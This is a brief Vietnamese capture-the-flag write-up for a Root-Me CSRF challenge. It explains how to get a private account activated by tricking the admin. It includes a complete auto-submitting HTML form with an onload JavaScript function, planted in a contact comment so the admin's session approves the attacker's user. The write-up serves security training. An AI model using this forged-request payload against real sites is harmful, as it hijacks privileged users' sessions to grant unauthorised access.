Đầu tiên tạo user, login, truy cập thẻ private thì hiện thông báo phải được admin kích hoạt mới access được. Checkbox thì bị disabled, enable rồi gửi request cũng không được, có vẻ chỉ admin với admin cookie mới có quyền làm thế.

Vì tiêu đề CSRF cũng đã gợi ý cho chúng ta khá nhiều, ta sẽ lợi dụng cookie của admin như sau: dụ admin load 1 `input form` của mình(status checkbox phải có thuộc tính `checked` rồi),  sẽ có 1 hàm javascript ép submit cái form đó ngay khi body được load. Cụ thể như sau:

```html
<html>
<head>
<script>
function forcesubmit() {document.getElementById("my-form").submit()}
</script>
</head>
<body onload="forcesubmit()">
<form action="http://challenge01.root-me.org/web-client/ch22/?action=profile" id="my-form" method="post" enctype="multipart/form-data">
<input type="text" name="username" value="dang">
<input type="checkbox" name="status" value="checked" checked>
</form>
</body>
</html>
```

value trong input username phải là username vừa được tạo mới. Gửi form trên trong ô Comment của phần Contact, đợi 2p vào tab Private ta sẽ có password